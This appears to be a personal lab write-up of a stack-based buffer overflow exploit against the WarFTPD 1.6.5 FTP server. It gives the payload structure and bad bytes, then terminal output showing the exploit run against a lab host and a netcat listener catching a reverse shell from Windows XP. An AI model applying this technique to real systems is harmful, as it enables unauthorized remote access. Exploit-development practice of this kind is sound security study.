# WarFTPD 1.6.5
Reference: https://www.exploit-db.com/exploits/3570
  
WarFTP is prone to a stack-based buffer-overflow vulnerability because it fails to properly check boundaries on user-supplied data before copying it to an insufficiently sized buffer.
  
## Notes

Payload structure: [OFFSET][JMP ESP][NOPSLED][SHELLCODE]  
Bad bytes: 00, 0a, 0d and 40  
*Note: To discover the 0x40 (@) character I had to open the exe in Ghidra and search for strings to determine which byte wasn't allowed*

### Exploit
See exploit.py.  
```bash
┌──(kali㉿kali)-[]-[~/Desktop]
└─$ ./exploit.py                                                                                                         
[+] Opening connection to 192.168.34.148 on port 21: Done
[*] 220- Jgaa's Fan Club FTP Service WAR-FTPD 1.65 Ready
    220 Please enter your user name.
[*] 331 User name okay, Need password.
[*] Closed connection to 192.168.34.148 port 21
```
Recieve shell.
```bash
┌──(kali㉿kali)-[]-[~/Desktop]
└─$ nc -lvnp 9999                                                                                                                                                           
listening on [any] 9999 ...
connect to [192.168.34.138] from (UNKNOWN) [192.168.34.148] 1101
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\Program Files\War-ftpd>hostname
hostname
user-d0da1cb800
```
